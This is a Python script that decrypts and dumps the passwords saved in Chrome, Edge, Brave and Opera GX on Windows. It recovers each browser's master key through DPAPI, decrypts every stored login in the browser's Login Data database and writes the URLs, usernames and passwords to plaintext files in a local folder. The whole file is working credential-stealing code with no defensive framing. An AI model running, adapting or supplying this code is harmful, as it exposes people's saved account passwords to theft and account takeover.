import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

def get_master_key(browser_path):
    try:
        with open(browser_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        return None

def fetch_passwords(browser_name, db_path, local_state_path):
    passwords = []
    master_key = get_master_key(local_state_path)
    if not master_key:
        return passwords

    try:
        shutil.copy2(db_path, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            password = decrypt_password(encrypted_password, master_key)
            if username or password:
                passwords.append({"url": url, "username": username, "password": password})
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")
    except:
        pass

    return passwords

def save_to_file(browser_name, credentials):
    folder_path = os.path.join("credenciales", browser_name)
    os.makedirs(folder_path, exist_ok=True)

    file_path = os.path.join(folder_path, "credentials.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        for entry in credentials:
            file.write(f"URL: {entry['url']}\n")
            file.write(f"Username: {entry['username']}\n")
            file.write(f"Password: {entry['password']}\n")
            file.write("\n")

def main():
    browsers = {
        "Chrome": {
            "db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        },
        "Edge": {
            "db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
        },
        "Brave": {
            "db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
        },
        "OperaGX": {
            "db_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
            "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
        }
    }

    for browser, paths in browsers.items():
        passwords = fetch_passwords(browser, paths["db_path"], paths["local_state_path"])
        save_to_file(browser, passwords)

if __name__ == "__main__":
    main()
